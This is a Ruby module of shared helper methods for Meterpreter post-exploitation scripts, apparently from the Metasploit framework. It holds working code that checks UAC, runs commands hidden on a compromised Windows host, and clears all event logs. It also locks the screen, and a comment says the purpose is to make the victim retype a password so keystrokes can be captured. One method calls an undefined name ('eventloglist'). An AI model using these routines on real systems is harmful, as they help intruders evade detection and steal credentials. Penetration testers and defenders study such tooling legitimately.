module Msf
module Scripts
module Meterpreter
module Common

#
# Commonly used methods and techniques for Meterpreter scripts
#

#
# These methods should only print output in the case of an error. All code should be tab indented
# All methods should follow the naming coventions below (separate words with "_", end queries with a ?, etc)
#

def is_uac_enabled?
	uac = false
	winversion = client.sys.config.sysinfo['OS']

	if winversion =~ /Windows (Vista|7)/
		if client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
			begin
				key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',KEY_READ)

				if key.query_value('EnableLUA').data == 1
					uac = true
				end

				key.close
			rescue::Exception => e
				print_error("Error Checking UAC: #{e.class} #{e}")
			end
		end
	end
    return uac
end

#Execute given command as hidden and channelized, output of command given as a multiline string.
def cmd_exec(cmd)
	client.response_timeout=120
	cmd = client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
	o = ""
	while(d = cmd.channel.read)
		o << d
	end
	cmd.channel.close
	cmd.close
	return o
end

#enumerate eventlogs
def eventlog_list
	key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Eventlog"
	eventlogs = reg_enumkeys(key)
	return eventlogs
end

#clears a given eventlog or all eventlogs if none is given. Returns an array of eventlogs that where cleared.
def eventlog_clear(evt = "")
	evntlog = []
	if evt.empty?
	       evntlog = eventloglist
	else
		evntlog << evt
	end
	evntlog.each do |e|
		log = client.sys.eventlog.open(e)
		log.clear
	end
	return evntlog
end

#lock screen specially useful for when forcing user to enter password. lock, migrate to winlogon.exe and capture keystroke.
def lock_screen
	cmd_exec("rundll32.exe user32.dll,LockWorkStation")
	return true
end

end
end
end
end

